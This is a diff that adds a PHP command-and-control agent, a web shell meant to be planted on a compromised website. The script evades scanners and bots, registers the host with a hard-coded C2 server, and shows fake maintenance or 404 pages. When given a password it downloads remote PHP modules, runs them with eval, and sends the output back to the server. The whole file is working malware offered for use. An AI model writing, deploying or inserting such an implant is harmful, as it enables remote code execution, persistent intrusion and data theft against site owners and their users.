@@ -1,0 +1,103 @@
+<?php
+/**
+ * C2 Agent - WAF Evasion + Compatible with C2 index.php
+ */
+
+$C2_URL = "http://31.70.135.150/c2/";
+$AUTH_KEY = "lab123";
+
+$default_headers = array(
+    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+);
+
+// Bot detection
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+if (preg_match('/(bot|crawl|spider|scanner|slurp)/i', $ua)) {
+    header('HTTP/1.1 200 OK');
+    echo '<html><body><!-- silent --></body></html>';
+    exit;
+}
+
+usleep(rand(100000, 500000));
+
+// ===== AUTO REGISTER =====
+if (empty($_GET) && empty($_POST)) {
+    $target_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+    $ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
+    
+    $postdata = http_build_query(array(
+        "url" => $target_url,
+        "name" => $_SERVER["HTTP_HOST"],
+        "ip" => $ip
+    ));
+    
+    $ch = curl_init($C2_URL . "?action=auto_register");
+    curl_setopt_array($ch, array(
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $postdata,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_HTTPHEADER => $default_headers,
+        CURLOPT_SSL_VERIFYPEER => false,
+    ));
+    curl_exec($ch);
+    curl_close($ch);
+    
+    header('HTTP/1.1 200 OK');
+    echo "<!DOCTYPE html><html><head><title>Site Maintenance</title></head><body><h1>We'll be back soon!</h1></body></html>";
+    exit;
+}
+
+// ===== AUTH =====
+$key = $_GET['key'] ?? '';
+if ($key !== $AUTH_KEY) {
+    header('HTTP/1.1 200 OK');
+    echo '<html><body><h1>404 Not Found</h1></body></html>';
+    exit;
+}
+
+// ===== MODULE EXECUTION =====
+$module = preg_replace("/[^a-zA-Z0-9_-]/", "", $_GET['module'] ?? '');
+
+$ch = curl_init($C2_URL . "?action=get_module&key=" . $AUTH_KEY . "&module=" . $module);
+curl_setopt_array($ch, array(
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 15,
+    CURLOPT_HTTPHEADER => $default_headers,
+    CURLOPT_SSL_VERIFYPEER => false,
+));
+$code = curl_exec($ch);
+curl_close($ch);
+
+if (!$code) {
+    header('HTTP/1.1 200 OK');
+    echo '<html><body><!-- module unavailable --></body></html>';
+    exit;
+}
+
+ob_start();
+eval("?" . ">" . $code);
+$result = ob_get_clean();
+
+// Submit report
+$postdata = http_build_query(array(
+    "target" => $_SERVER["HTTP_HOST"],
+    "module" => $module,
+    "report" => $result
+));
+
+$ch = curl_init($C2_URL . "?action=submit_report&key=" . $AUTH_KEY);
+curl_setopt_array($ch, array(
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $postdata,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 10,
+    CURLOPT_HTTPHEADER => $default_headers,
+    CURLOPT_SSL_VERIFYPEER => false,
+));
+curl_exec($ch);
+curl_close($ch);
+
+echo $result;
+?>
